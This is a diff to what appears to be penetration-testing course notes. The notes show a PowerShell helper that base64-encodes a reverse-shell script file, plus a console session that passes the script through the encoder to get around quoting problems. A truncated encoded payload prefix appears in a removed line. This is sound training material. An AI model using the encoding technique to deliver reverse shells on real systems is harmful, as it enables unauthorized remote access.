@@ -51,17 +51,17 @@ param([String]$text)
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
 $Encoded = [Convert]::ToBase64String($Bytes)
-Write-Host($Encoded)
+return $Encoded
 ```
 {% endcode %}
 
-This was then used by reading the file into a string variable then passing the variable as an argument to the script. All this was done to escape the problems caused by the presence of both quotation marks and apostrophes in the reverse shell&#x20;
+This was then used by reading the file into a string variable then passing the variable as an argument to the script. All this was done to escape the problems caused by the presence of both quotation marks and apostrophes in the reverse shell:
 
 {% code overflow="wrap" %}
-```shell-session
+```powershell
 PS C:\Users\offsec> $revTxt = [IO.File]::ReadAllText("rev_shell.ps1")
 
-PS C:\Users\offsec> ./base_enc.ps1 $revTxt                                                                                       JABjAGwAaQBlAG4AdAAgAD...
+PS C:\Users\offsec> .\base_enc.ps1 $revTxt | Out-File -Path .\rev.base64                                                                                      
 ```
 {% endcode %}
 
